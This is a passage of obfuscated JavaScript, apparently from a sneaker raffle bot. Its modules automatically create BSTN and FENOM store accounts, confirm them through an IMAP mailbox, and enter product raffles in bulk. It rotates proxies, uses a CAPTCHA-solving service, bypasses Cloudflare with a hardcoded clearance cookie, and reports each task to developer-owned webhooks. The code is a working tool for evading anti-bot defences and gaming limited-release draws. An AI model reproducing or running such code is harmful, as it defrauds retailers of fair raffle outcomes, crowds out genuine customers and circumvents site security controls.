                        await _0x6f470f(_0x2ac825, _0x195c46), _0x16d703(_0xaa0383['name'] + '\x20Task\x20' + (_0x195c46 + 0x1) + '\x20/\x20' + _0x2ac825['length'] + '\x20||\x20File:\x20' + _0x78687a + '\x20Proxies:\x20' + _0x1d42f7);
                        var _0xc48353 = await _0x296449(_0x2ac825[_0x195c46], _0xaa0383, 'acc', ![]);
                        const _0x35b26d = { 'succesDEVMSG': { 'embeds': [_0xc48353] } }, _0x4b48d7 = 'https://www.bstn.com/eu_en/customer/account/create/';
                        var _0x523f4c = Math['round'](Math['random']() * (_0x34183f['length'] - 0x1)), _0x153a8c = _0x34183f[_0x523f4c]['split'](':');
                        const _0x4a1f1c = await _0x25d1cc['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x153a8c[0x0] + ':' + _0x153a8c[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x2ebc4e = await _0x4a1f1c['newPage']();
                            await _0x2ebc4e['authenticate']({
                                'username': '' + _0x153a8c[0x2],
                                'password': '' + _0x153a8c[0x3]
                            }), console['log'](_0x441ea7() + '\x20[' + _0xaa0383['name'] + ']\x20Task\x20' + (_0x195c46 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2ebc4e['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x2ebc4e['setRequestInterception'](!![]), _0x2ebc4e['on']('request', _0x2e53c0 => {
                                _0x2e53c0['resourceType']() === 'image' ? _0x2e53c0['abort']() : _0x2e53c0['continue']();
                            }), await _0x2ebc4e['goto']('' + _0x4b48d7), await _0x2ebc4e['waitForSelector']('button[class=\x22cf2Lf6\x22]'), await _0x2ebc4e['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x441ea7() + '\x20[' + _0xaa0383['name'] + ']\x20Task\x20' + (_0x195c46 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x7e80ad(0x7d0), console['log'](_0x441ea7() + '\x20[' + _0xaa0383['name'] + ']\x20Task\x20' + (_0x195c46 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x7e80ad(0x190), await _0x2ebc4e['waitForSelector']('#firstname'), await _0x2ebc4e['type']('#firstname', _0x2ac825[_0x195c46]['FirstName'], { 'delay': 0xf0 }), await _0x7e80ad(0x190), await _0x2ebc4e['type']('#lastname', _0x2ac825[_0x195c46]['LastName'], { 'delay': 0xe6 }), await _0x7e80ad(0x190), await _0x2ebc4e['type']('#email_address', _0x2ac825[_0x195c46]['Email'], { 'delay': 0x122 }), await _0x7e80ad(0x190), await _0x2ebc4e['type']('#password', _0x2ac825[_0x195c46]['Password'], { 'delay': 0x82 }), await _0x7e80ad(0x1f4), await _0x2ebc4e['type']('#password-confirmation', _0x2ac825[_0x195c46]['Password'], { 'delay': 0x7c }), console['log'](_0x441ea7() + '\x20[' + _0xaa0383['name'] + ']\x20Task\x20' + (_0x195c46 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x7e80ad(0x2bc), await _0x2ebc4e['$eval']('#form-validate', _0x3843b8 => _0x3843b8['submit']()), await _0x7e80ad(0x1388);
                            const _0x378696 = await _0x2ebc4e['$']('#email_address-error');
                            if (_0x378696)
                                throw new Error('Invalid\x20Email');
                            const _0x4a75df = await _0x2ebc4e['$']('#password-error');
                            if (_0x4a75df)
                                throw new Error('Invalid\x20Password');
                            await _0x2ebc4e['waitForSelector']('div.mesg-success'), _0x38b92e = 'no', console['log'](_0x1a235e['green'](_0x441ea7() + '\x20[' + _0xaa0383['name'] + ']\x20Task\x20' + (_0x195c46 + 0x1) + '\x20:\x20Account\x20' + _0x2ac825[_0x195c46]['Email'] + '\x20Generated')), _0x40e0db['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x2ac825[_0x195c46]['Email'] + ',' + _0x2ac825[_0x195c46]['Password']);
                            try {
                                _0x8702f0['webhook'] != undefined && _0x8702f0['webhook'] != '' && await _0x10a0d6(_0x8702f0['webhook'], _0x35b26d['succesDEVMSG']);
                            } catch {
                            }
                            await _0x10a0d6(_0x54e762, _0x35b26d['succesDEVMSG']), console['log'](_0x1a235e['yellow'](_0x441ea7() + '\x20[' + _0xaa0383['name'] + ']\x20Task\x20' + (_0x195c46 + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                        } catch (_0x5cc661) {
                            console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0xaa0383['name'] + ']\x20Task\x20' + (_0x195c46 + 0x1) + '\x20:\x20' + _0x5cc661)), _0x109a9b = '' + _0x5cc661;
                            var _0x318368 = await _0x296449(_0x2ac825[_0x195c46], _0xaa0383, 'acc', !![], _0x109a9b);
                            _0x35b26d['errorDEV'] = { 'embeds': [_0x318368] }, _0x8702f0['webhook'] != undefined && _0x8702f0['webhook'] != '' && await _0x10a0d6(_0x8702f0['webhook'], _0x35b26d['errorDEV']), await _0x10a0d6(_0x5cf6ec, _0x35b26d['errorDEV']), _0x38b92e = 'yes';
                        } finally {
                            _0x4a1f1c['close']();
                            if (_0x38b92e == 'yes' && _0x1b6806 != 0x5) {
                                console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0xaa0383['name'] + ']\x20Task\x20' + (_0x195c46 + 0x1) + '\x20:\x20Retrying')), _0x195c46 = _0x195c46 - 0x1, _0x1b6806 = _0x1b6806 + 0x1;
                                continue;
                            }
                            _0x38b92e == 'yes' && _0x1b6806 >= 0x5 && (_0xc1caad(_0x2ac825[_0x195c46], _0xaa0383), _0x38b92e = 'no', _0x1b6806 = 0x0), console['log'](_0x441ea7() + '\x20[' + _0xaa0383['name'] + ']\x20Waiting\x20for\x20' + _0x8702f0['delay'] + '\x20ms'), await _0x7e80ad(_0x8702f0['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x2ca48e, _0x2c0df5) {
                    var _0x3d7b3e = [];
                    async function _0x21539f() {
                        var _0x16e554 = new _0x3602ef({
                            'user': _0x8702f0['masterMail'],
                            'password': _0x8702f0['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x21fb1a(_0x5f1f1f) {
                            _0x16e554['openBox']('INBOX', ![], _0x5f1f1f);
                        }
                        _0x16e554['once']('ready', function () {
                            _0x21fb1a(function (_0x1fb2ad, _0x5527f7) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x1fb2ad)
                                    throw _0x1fb2ad;
                                _0x16e554['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'FROM',
                                        'no-reply@store.bstn.com'
                                    ]
                                ], function (_0x5d961c, _0x648177) {
                                    if (!_0x648177 || !_0x648177['length'])
                                        console['log'](_0x441ea7() + '\x20[' + _0x2ca48e['name'] + ']\x20No\x20mails\x20found'), _0x16e554['end']();
                                    else {
                                        var _0xcb438c = _0x16e554['seq']['fetch'](_0x648177, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0xcb438c['on']('message', function (_0x2ed5db, _0x46d708) {
                                            var _0x5f3456 = '(#' + _0x46d708 + ')\x20';
                                            _0x2ed5db['on']('body', function (_0x3d6db6, _0x236bce) {
                                                _0x40c426(_0x3d6db6, (_0x36a0a5, _0x499eb2) => {
                                                    if (_0x499eb2['subject'] == 'Please\x20confirm\x20your\x20BSTN\x20Store\x20account') {
                                                        var _0x175fad = _0x499eb2['text']['split']('[')[0x2], _0x421088 = _0x175fad['split'](']')[0x0], _0x3772f4 = _0x499eb2['html']['split']('\x0a');
                                                        _0x3d7b3e['push'](_0x421088);
                                                    }
                                                });
                                            }), _0x2ed5db['once']('end', function () {
                                            });
                                        }), _0xcb438c['once']('error', function (_0x1b4745) {
                                            console['log']('Fetch\x20error:\x20' + _0x1b4745);
                                        }), _0xcb438c['once']('end', function () {
                                            _0x16e554['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x16e554['once']('error', function (_0x26d726) {
                            console['log'](_0x1a235e['red'](_0x26d726['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x16e554['once']('end', async function () {
                        }), _0x16e554['connect']();
                    }
                    async function _0x367ea8(_0x4056e0, _0x1525af, _0x27bfd0) {
                        _0x25d1cc['use'](_0x543a6c());
                        for (var _0x2f4494 = 0x0; _0x2f4494 < _0x1525af['length']; _0x2f4494++) {
                            if (_0x25db92 != 'yes')
                                var _0x25db92 = '', _0x479f29 = 0x0;
                            var _0x53f7ca = Math['round'](Math['random']() * (_0x27bfd0['length'] - 0x1)), _0x1fa565 = _0x27bfd0[_0x53f7ca]['split'](':');
                            const _0x48e952 = await _0x25d1cc['launch']({
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1fa565[0x0] + ':' + _0x1fa565[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                            try {
                                const _0x29d0e6 = await _0x48e952['newPage']();
                                await _0x29d0e6['authenticate']({
                                    'username': '' + _0x1fa565[0x2],
                                    'password': '' + _0x1fa565[0x3]
                                }), console['log'](_0x441ea7() + '\x20[' + _0x4056e0['name'] + ']\x20Task\x20' + (_0x2f4494 + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x29d0e6['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x29d0e6['setRequestInterception'](!![]), _0x29d0e6['on']('request', _0x4bfabc => {
                                    _0x4bfabc['resourceType']() === 'image' || _0x4bfabc['resourceType']() === 'font' || _0x4bfabc['resourceType']() === 'media' ? _0x4bfabc['abort']() : _0x4bfabc['continue']();
                                }), console['log'](_0x441ea7() + '\x20[' + _0x4056e0['name'] + ']\x20Task\x20' + (_0x2f4494 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x29d0e6['goto'](_0x1525af[_0x2f4494]), console['log'](_0x441ea7() + '\x20[' + _0x4056e0['name'] + ']\x20Task\x20' + (_0x2f4494 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x29d0e6['waitForTimeout'](0xbb8);
                                try {
                                    await _0x29d0e6['waitForSelector']('.account-nav'), _0x25db92 = 'no', console['log'](_0x1a235e['green'](_0x441ea7() + '\x20[' + _0x4056e0['name'] + ']\x20Task\x20' + (_0x2f4494 + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x18a085 = await _0x296449(null, _0x4056e0, 'ver', ![]);
                                    const _0x5b8df6 = { 'succesDEVMSG': { 'embeds': [_0x18a085] } };
                                    await _0x10a0d6(_0x3a1abe, _0x5b8df6['succesDEVMSG']);
                                } catch (_0x322d90) {
                                    throw new Error(_0x322d90);
                                }
                            } catch (_0xf000ee) {
                                console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x4056e0['name'] + ']\x20Task\x20' + (_0x2f4494 + 0x1) + '\x20:\x20' + _0xf000ee));
                                var _0x27d5cd = _0xf000ee, _0x48e781 = await _0x296449(null, _0x4056e0, 'ver', !![], _0x27d5cd);
                                const _0x766f9b = { 'errorDEVMSG': { 'embeds': [_0x48e781] } };
                                _0x8702f0['webhook'] != undefined && _0x8702f0['webhook'] != '' && await _0x10a0d6(_0x8702f0['webhook'], _0x766f9b['errorDEVMSG']), await _0x10a0d6(_0x5cf6ec, _0x766f9b['errorDEVMSG']), _0x25db92 = 'yes';
                            } finally {
                                _0x48e952['close']();
                                if (_0x25db92 == 'yes' && _0x479f29 != 0x5) {
                                    console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x4056e0['name'] + ']\x20Task\x20' + (_0x2f4494 + 0x1) + '\x20:\x20Retrying')), _0x2f4494 = _0x2f4494 - 0x1, _0x479f29 = _0x479f29 + 0x1;
                                    continue;
                                }
                                _0x25db92 == 'yes' && _0x479f29 >= 0x5 && (_0x25db92 = 'no', _0x479f29 = 0x0), console['log'](_0x441ea7() + '\x20[' + _0x4056e0['name'] + ']\x20Waiting\x20for\x20' + _0x8702f0['delay'] + '\x20ms'), await _0x7e80ad(_0x8702f0['delay']);
                            }
                        }
                    }
                    try {
                        _0x21539f(), await _0x7e80ad(0xfa0), console['log']('Found\x20' + _0x3d7b3e['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x7e80ad(0x7d0);
                    }
                    await _0x367ea8(_0x2ca48e, _0x3d7b3e, _0x2c0df5);
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x491150, _0x1665ff, _0x15a882) {
                    _0x25d1cc['use'](_0x543a6c()), _0x25d1cc['use'](_0x49aced({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x8702f0['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x43c129 = 0x0; _0x43c129 < _0x1665ff['length']; _0x43c129++) {
                        var _0x5645a1;
                        await _0x6f470f(_0x1665ff, _0x43c129);
                        if (_0x3e0b22 != 'yes')
                            var _0x3e0b22 = '', _0x58063d = 0x0;
                        _0x16d703(_0x491150['name'] + '\x20Task\x20' + (_0x43c129 + 0x1) + '\x20/\x20' + _0x1665ff['length'] + '\x20||\x20File:\x20' + _0x78687a + '\x20Proxies:\x20' + _0x1d42f7);
                        var _0x32f104 = Math['round'](Math['random']() * (_0x15a882['length'] - 0x1)), _0xccc607 = _0x15a882[_0x32f104]['split'](':'), _0x18ef14;
                        try {
                            _0x18ef14 = await _0x25d1cc['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0xccc607[0x0] + ':' + _0xccc607[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x18ef14 = await _0x25d1cc['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0xccc607[0x0] + ':' + _0xccc607[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x255b64 = await _0x18ef14['newPage'](), _0x597bbd = await _0x255b64['target']()['createCDPSession'](), { windowId: _0x1b83a0 } = await _0x597bbd['send']('Browser.getWindowForTarget');
                            await _0x255b64['setViewport']({
                                'width': 0x501,
                                'height': 0x2d0
                            });
                            var _0x362da6 = [{
                                'name': 'cf_clearance',
                                'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                'domain': '.bstn.com',
                                'path': '/',
                                'expires': 1707818183.331533,
                                'httpOnly': !![],
                                'secure': !![]
                            }];
                            await _0x255b64['authenticate']({
                                'username': '' + _0xccc607[0x2],
                                'password': '' + _0xccc607[0x3]
                            }), console['log'](_0x441ea7() + '\x20[' + _0x491150['name'] + ']\x20Task\x20' + (_0x43c129 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x255b64['goto']('' + _0x1665ff[_0x43c129]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x441ea7() + '\x20[' + _0x491150['name'] + ']\x20Task\x20' + (_0x43c129 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x255b64['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L'), await _0x597bbd['send']('Browser.setWindowBounds', {
                                'windowId': _0x1b83a0,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x7e80ad(0x1388), await _0x255b64['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x255b64['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x7e80ad(0x1f4), console['log'](_0x441ea7() + '\x20[' + _0x491150['name'] + ']\x20Task\x20' + (_0x43c129 + 0x1) + '\x20:\x20Logging\x20in'), await _0x255b64['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x5df357 => _0x5df357['click']()), await _0x255b64['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x255b64['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x7e80ad(0x7d0), await _0x255b64['waitForSelector']('#email-login'), await _0x255b64['type']('#email-login', '' + _0x1665ff[_0x43c129]['Email']), await _0x7e80ad(0xdac), await _0x255b64['waitForSelector']('#password'), await _0x255b64['type']('#password', '' + _0x1665ff[_0x43c129]['Password'], { 'delay': 0xe6 }), await _0x7e80ad(0x157c);
                            try {
                                await _0x255b64['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x34b159 => _0x34b159['click']());
                            } catch {
                            }
                            try {
                                await _0x255b64['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                            } catch (_0x21560f) {
                            }
                            await _0x7e80ad(0x3e8);
                            const _0x1615e2 = await _0x255b64['$']('.enteredDraw_container__2KmQ_');
                            if (_0x1615e2)
                                throw new Error('Duplicate\x20Entry');
                            console['log'](_0x441ea7() + '\x20[' + _0x491150['name'] + ']\x20Task\x20' + (_0x43c129 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x1665ff[_0x43c129]['Size']);
                            if (_0x1665ff[_0x43c129]['Size'] != 'RANDOM') {
                                var _0x52f586 = _0x1665ff[_0x43c129]['Size']['replace']('.', ',');
                                const _0x30b29a = await _0x255b64['$x']('//div[contains(text(),\x20' + _0x52f586 + ')]');
                                await _0x30b29a[0x0]['click']();
                            } else {
                                const _0x4c753e = await _0x255b64['$$']('div.swatchTile_tile__IRH9Q');
                                var _0x29bff1 = Math['round'](Math['random']() * (_0x4c753e['length'] - 0x1));
                                await _0x4c753e[_0x29bff1]['click']();
                            }
                            await _0x7e80ad(0x1f4);
                            const _0xccf4c = await _0x255b64['$']('.addressList_addressItem__LE2PB');
                            if (_0xccf4c && _0x1665ff[_0x43c129]['Mode'] != 'NEW') {
                            } else
                                console['log'](_0x441ea7() + '\x20[' + _0x491150['name'] + ']\x20Task\x20' + (_0x43c129 + 0x1) + '\x20:\x20Filling\x20Address'), await _0x255b64['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x7e80ad(0x5dc), await _0x255b64['waitForSelector']('#firstname'), await _0x255b64['type']('#firstname', '' + _0x1665ff[_0x43c129]['FirstName']), await _0x7e80ad(0x1f4), await _0x255b64['waitForSelector']('#firstname'), await _0x255b64['type']('#lastname', '' + _0x1665ff[_0x43c129]['LastName']), await _0x7e80ad(0x1f4), await _0x255b64['waitForSelector']('#firstname'), await _0x255b64['type']('#street', '' + _0x1665ff[_0x43c129]['Address1']), await _0x7e80ad(0x1f4), await _0x255b64['waitForSelector']('#firstname'), await _0x255b64['type']('#houseNumber', _0x1665ff[_0x43c129]['HouseNumber'] + '\x20' + _0x1665ff[_0x43c129]['Address2']), await _0x7e80ad(0x1f4), await _0x255b64['waitForSelector']('#firstname'), await _0x255b64['select']('#country_code', '' + _0x1665ff[_0x43c129]['Country']), await _0x7e80ad(0x1f4), await _0x255b64['type']('#postcode', '' + _0x1665ff[_0x43c129]['Zip']), await _0x7e80ad(0x1f4), await _0x255b64['type']('#city', '' + _0x1665ff[_0x43c129]['City']), await _0x7e80ad(0x1f4), await _0x255b64['type']('#telephone', '' + _0x1665ff[_0x43c129]['Phone']), await _0x7e80ad(0x1f4), await _0x255b64['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                            await _0x7e80ad(0x9c4);
                            try {
                                await _0x255b64['type']('#instagram_name', '' + _0x1665ff[_0x43c129]['Follower']), await _0x255b64['click']('.note_groupBtn__WLDwH\x20>\x20button');
                            } catch {
                            }
                            console['log'](_0x441ea7() + '\x20[' + _0x491150['name'] + ']\x20Task\x20' + (_0x43c129 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x7e80ad(0x5dc);
                            try {
                                await _0x255b64['click']('.checkBox_boxHolder__wLGVe');
                            } catch {
                            }
                            await _0x7e80ad(0x5dc), await _0x255b64['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x4c6d04 => _0x4c6d04['click']()), await _0x7e80ad(0x1388);
                            try {
                                await _0x255b64['waitForSelector']('.success_msg__2HjJY');
                            } catch {
                                await _0x255b64['reload']({ 'waitUntil': 'networkidle2' });
                                if (_0x1665ff[_0x43c129]['Size'] != 'RANDOM') {
                                    var _0x52f586 = _0x1665ff[_0x43c129]['Size']['replace']('.', ',');
                                    const _0x5da96b = await _0x255b64['$x']('//div[contains(text(),\x20' + _0x52f586 + ')]');
                                    await _0x5da96b[0x0]['click']();
                                } else {
                                    const _0x214934 = await _0x255b64['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x29bff1 = Math['round'](Math['random']() * (_0x214934['length'] - 0x1));
                                    await _0x214934[_0x29bff1]['click']();
                                }
                                await _0x7e80ad(0x5dc);
                                try {
                                    await _0x255b64['hover']('#instagram_name'), await _0x255b64['type']('#instagram_name', '' + _0x1665ff[_0x43c129]['Follower']), await _0x255b64['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x441ea7() + '\x20[' + _0x491150['name'] + ']\x20Task\x20' + (_0x43c129 + 0x1) + '\x20:\x20Retrying'), await _0x255b64['hover']('.checkBox_boxHolder__wLGVe'), await _0x7e80ad(0x5dc), await _0x255b64['click']('.checkBox_boxHolder__wLGVe'), await _0x7e80ad(0x157c), await _0x255b64['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x52f8b6 => _0x52f8b6['click']()), await _0x7e80ad(0x1388), await _0x255b64['waitForSelector']('.success_msg__2HjJY');
                            }
                            _0x3e0b22 = 'no', _0x4bdc1f(_0x1665ff[_0x43c129], _0x491150), console['log'](_0x1a235e['green'](_0x441ea7() + '\x20[' + _0x491150['name'] + ']\x20Task\x20' + (_0x43c129 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            var _0x5abbd3 = await _0x296449(_0x1665ff[_0x43c129], _0x491150, 'dev', ![]), _0x108331 = await _0x296449(_0x1665ff[_0x43c129], _0x491150, 'pub', ![]);
                            const _0x8d74f8 = {
                                'succesDEVMSG': { 'embeds': [_0x5abbd3] },
                                'succesPUBMSG': { 'embeds': [_0x108331] }
                            };
                            try {
                                _0x8702f0['webhook'] != undefined && _0x8702f0['webhook'] != '' && await _0x10a0d6(_0x8702f0['webhook'], _0x8d74f8['succesDEVMSG']), await _0x7e80ad(0xc8), await _0x10a0d6(_0x2ae18c, _0x8d74f8['succesDEVMSG']), await _0x7e80ad(0xc8), await _0x10a0d6(_0x355433, _0x8d74f8['succesPUBMSG']);
                            } catch (_0x25ef1b) {
                                console['log'](_0x1a235e['yellow'](_0x441ea7() + '\x20[' + _0x491150['name'] + ']\x20Task\x20' + (_0x43c129 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x25ef1b));
                            }
                        } catch (_0xca7dbb) {
                            console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x491150['name'] + ']\x20Task\x20' + (_0x43c129 + 0x1) + '\x20:\x20' + _0xca7dbb)), _0x3e0b22 = 'yes', _0x5645a1 = '' + _0xca7dbb;
                            var _0x5f5929 = await _0x296449(_0x1665ff[_0x43c129], _0x491150, 'dev', !![], _0x5645a1), _0x5abbd3 = await _0x296449(_0x1665ff[_0x43c129], _0x491150, 'dev', ![]), _0x108331 = await _0x296449(_0x1665ff[_0x43c129], _0x491150, 'pub', ![]);
                            const _0xbee89f = {
                                'succesDEVMSG': { 'embeds': [_0x5abbd3] },
                                'succesPUBMSG': { 'embeds': [_0x108331] }
                            };
                            _0xbee89f['errorDEV'] = { 'embeds': [_0x5f5929] }, _0x8702f0['webhook'] != undefined && _0x8702f0['webhook'] != '' && await _0x10a0d6(_0x8702f0['webhook'], _0xbee89f['errorDEV']), await _0x10a0d6(_0x5cf6ec, _0xbee89f['errorDEV']);
                        } finally {
                            _0x18ef14['close']();
                            if (_0x3e0b22 == 'yes' && _0x58063d != 0x5) {
                                console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x491150['name'] + ']\x20Task\x20' + (_0x43c129 + 0x1) + '\x20:\x20Retrying')), _0x43c129 = _0x43c129 - 0x1, _0x58063d = _0x58063d + 0x1;
                                continue;
                            }
                            _0x3e0b22 == 'yes' && _0x58063d >= 0x5 && (_0xc1caad(_0x1665ff[_0x43c129], _0x491150), _0x3e0b22 = 'no', _0x58063d = 0x0), console['log'](_0x441ea7() + '\x20[' + _0x491150['name'] + ']\x20Waiting\x20for\x20' + _0x8702f0['delay'] + '\x20ms'), await _0x7e80ad(_0x8702f0['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x1c061a, _0x734df2, _0x37ee7f) {
                    _0x25d1cc['use'](_0x543a6c()), _0x25d1cc['use'](_0x49aced({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x8702f0['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xfc28d2 = 0x0; _0xfc28d2 < _0x734df2['length']; _0xfc28d2++) {
                        if (_0x4f24ef != 'yes')
                            var _0x4f24ef = '', _0x539dc5 = 0x0;
                        var _0x59860d;
                        await _0x6f470f(_0x734df2, _0xfc28d2), _0x16d703(_0x1c061a['name'] + '\x20Task\x20' + (_0xfc28d2 + 0x1) + '\x20/\x20' + _0x734df2['length'] + '\x20||\x20File:\x20' + _0x78687a + '\x20Proxies:\x20' + _0x1d42f7);
                        var _0x5d21c9 = await _0x296449(_0x734df2[_0xfc28d2], _0x1c061a, 'acc', ![]);
                        const _0x171436 = { 'succesDEVMSG': { 'embeds': [_0x5d21c9] } }, _0x206ed0 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x449c59 = Math['round'](Math['random']() * (_0x37ee7f['length'] - 0x1)), _0x247ee9 = _0x37ee7f[_0x449c59]['split'](':'), _0x257e0b;
                        try {
                            _0x257e0b = await _0x25d1cc['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x247ee9[0x0] + ':' + _0x247ee9[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x257e0b = await _0x25d1cc['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x247ee9[0x0] + ':' + _0x247ee9[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x2e8cb0 = await _0x257e0b['newPage']();
                            await _0x2e8cb0['setViewport']({
                                'width': 0x500 + _0x545162(0x1, 0x32),
                                'height': 0x2d9 + _0x545162(0x1, 0x32)
                            });
                            const _0x16853e = await _0x2e8cb0['target']()['createCDPSession'](), { windowId: _0x2df3c9 } = await _0x16853e['send']('Browser.getWindowForTarget');
                            await _0x2e8cb0['authenticate']({
                                'username': '' + _0x247ee9[0x2],
                                'password': '' + _0x247ee9[0x3]
                            }), console['log'](_0x441ea7() + '\x20[' + _0x1c061a['name'] + ']\x20Task\x20' + (_0xfc28d2 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2e8cb0['goto']('' + _0x206ed0, { 'waitUntil': 'networkidle2' }), await _0x7e80ad(0x1388), console['log'](_0x441ea7() + '\x20[' + _0x1c061a['name'] + ']\x20Task\x20' + (_0xfc28d2 + 0x1) + '\x20:\x20Solving\x20Cloudflare');
                            try {
                                const _0x37761a = await _0x2e8cb0['$eval']('input[value=\x22Verify\x20you\x20are\x20human\x22]');
                                _0x37761a && await _0x37761a['click']();
                            } catch {
                            }
                            await _0x16853e['send']('Browser.setWindowBounds', {
                                'windowId': _0x2df3c9,
                                'bounds': { 'windowState': 'minimized' }
                            });
                            try {
                                await _0x2e8cb0['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x7e80ad(0xfa0);
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
